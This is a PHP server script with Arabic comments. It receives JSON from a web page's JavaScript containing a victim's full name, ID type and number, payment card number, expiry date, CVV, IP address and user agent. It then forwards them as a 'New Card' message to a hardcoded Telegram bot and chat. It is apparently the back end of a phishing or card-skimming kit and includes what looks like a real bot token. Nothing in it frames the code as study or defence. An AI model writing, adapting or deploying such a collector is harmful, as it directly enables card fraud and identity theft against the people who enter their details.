<?php
// معلومات البوت والتشات
$BOT_TOKEN = "7842979889:AAFx8OWZixxilL4acDLUMDx9sWp6SjnmIeo";
$CHAT_ID = "5075680045";

// استقبال البيانات المرسلة من الجافاسكريبت
$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    http_response_code(400);
    echo "No data received";
    exit;
}

// حماية من القيم الفارغة
function h($s) { return htmlspecialchars($s ?? '', ENT_QUOTES, 'UTF-8'); }

$customerName = h($data['customerName']);
$customerType = h($data['customerType']);
$customerId   = h($data['customerId']);
$cardNumber   = h($data['cardNumber']);
$expirationYear = h($data['expirationYear']);
$expirationMonth = h($data['expirationMonth']);
$cvv          = h($data['cvv']);
$ip           = h($data['ip']);
$userAgent    = h($data['userAgent']);
$timeString   = h($data['timeString']);

// بناء الرسالة
$text = "🚗🚗 New Card 🚗🚗:\n"
      . "Full Name: $customerName\n"
      . "ID Type: $customerType\n"
      . "ID Number: $customerId\n"
      . "Card Number: $cardNumber\n"
      . "Expiration: $expirationMonth/$expirationYear\n"
      . "CVV: $cvv\n"
      . "IP: $ip\n"
      . "User-Agent: $userAgent\n"
      . "Time: $timeString";

// تحضير بيانات الإرسال
$apiURL = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage";
$params = [
    "chat_id" => $CHAT_ID,
    "text"    => $text
];

// تنفيذ الطلب باستخدام file_get_contents
$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($params),
        'timeout' => 10
    ]
];
$context  = stream_context_create($options);
$result = @file_get_contents($apiURL, false, $context);

if ($result === FALSE) {
    http_response_code(500);
    echo "Failed to send";
} else {
    echo "OK";
}
?>